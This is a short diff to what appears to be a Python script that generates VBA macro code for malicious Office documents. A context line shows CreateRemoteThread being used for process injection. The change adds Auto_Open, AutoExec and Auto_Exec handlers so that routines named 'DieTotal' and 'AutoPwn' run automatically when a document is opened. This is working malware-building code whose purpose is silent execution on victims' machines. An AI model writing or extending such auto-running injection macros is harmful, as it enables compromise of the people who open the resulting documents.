@@ -505,7 +505,19 @@ lines1 += ["hThread = CreateRemoteThread(hProcess, 0&, 0&, ByVal lLinkToLibrary,
 "Sub Workbook_Open()\r\n",
 "DieTotal\r\n",
 "AutoPwn\r\n",
-"End Sub\r\n"]
+"End Sub\r\n",
+"Sub Auto_Open()\r\n",
+"DieTotal\r\n",
+"AutoPwn\r\n",
+"End Sub\r\n",
+"Sub AutoExec()\r\n",
+"DieTotal\r\n",
+"AutoPwn\r\n",
+"End Sub\r\n",
+"Sub Auto_Exec()\r\n",
+"DieTotal\r\n",
+"AutoPwn\r\n",
+"End Sub"]
 
 # Open and write to text file
 
